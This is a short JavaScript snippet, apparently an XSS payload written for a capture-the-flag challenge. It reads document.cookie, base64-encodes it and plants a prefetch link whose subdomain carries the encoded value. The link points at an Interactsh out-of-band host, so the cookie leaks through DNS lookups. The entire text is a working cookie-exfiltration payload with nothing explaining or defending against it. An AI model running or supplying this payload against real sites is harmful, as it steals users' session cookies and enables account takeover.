setTimeout(() => {
    let flag = document.cookie;
    
    // Convert to Base64, remove '=' padding, and make it completely lowercase
    let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();

    // Create the DNS prefetch link
    let link = document.createElement('link');
    link.rel = 'prefetch';
    
    // Inject the flag as a subdomain of your Interactsh domain
    link.href = 'http://' + safeFlag + '.yzblscxpmqfiqbulugygj7soovv9fyojx.oast.fun/';
    
    document.head.appendChild(link);
}, 2000);
